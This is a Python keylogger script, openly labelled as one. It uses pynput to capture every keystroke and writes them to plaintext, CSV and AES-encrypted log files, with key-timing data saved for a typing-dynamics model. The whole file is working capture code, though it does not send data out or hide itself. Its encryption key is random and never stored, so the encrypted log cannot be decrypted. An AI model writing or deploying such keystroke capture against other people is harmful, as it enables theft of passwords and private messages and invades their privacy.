import os
import csv
import time
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import numpy as np

# File Paths
LOG_FILE = "log.txt"
CSV_FILE = "log.csv"
ENC_FILE = "log.enc"

# Overwrite existing log files on every run
def reset_log_files():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)  # Delete old log file

    if os.path.exists(CSV_FILE):
        os.remove(CSV_FILE)  # Delete old CSV file

    if os.path.exists(ENC_FILE):
        os.remove(ENC_FILE)  # Delete old encrypted file

    # Create fresh log files
    with open(LOG_FILE, "w") as f:
        f.write("")

    with open(CSV_FILE, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Key", "Hold Time"])  # Write headers

    with open(ENC_FILE, "wb") as f:
        f.write(b"")

# Call reset function at the start
reset_log_files()

# Encryption Key (AES-128, 16 bytes)
ENCRYPTION_KEY = get_random_bytes(16)

# Track typing speed for AI
keystroke_data = []
last_time = time.time()

# AES Encryption function
def encrypt_data(data):
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return cipher.nonce + tag + ciphertext

# Log key press
def log_key(key, hold_time):
    global last_time
    key_str = str(key).replace("'", "")

    # Save to log files
    with open(LOG_FILE, "a") as f:
        f.write(f"{key_str}\n")

    with open(CSV_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([key_str, hold_time])

    with open(ENC_FILE, "ab") as f:
        encrypted_data = encrypt_data(key_str)
        f.write(encrypted_data)

    # Store keystroke dynamics for AI
    keystroke_data.append([hold_time])
    last_time = time.time()

# Capture key press
def on_press(key):
    global last_time
    hold_time = time.time() - last_time
    log_key(key, hold_time)

# Stop on Esc key
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Save keystroke dynamics for AI
np.save("keystroke_data.npy", np.array(keystroke_data))
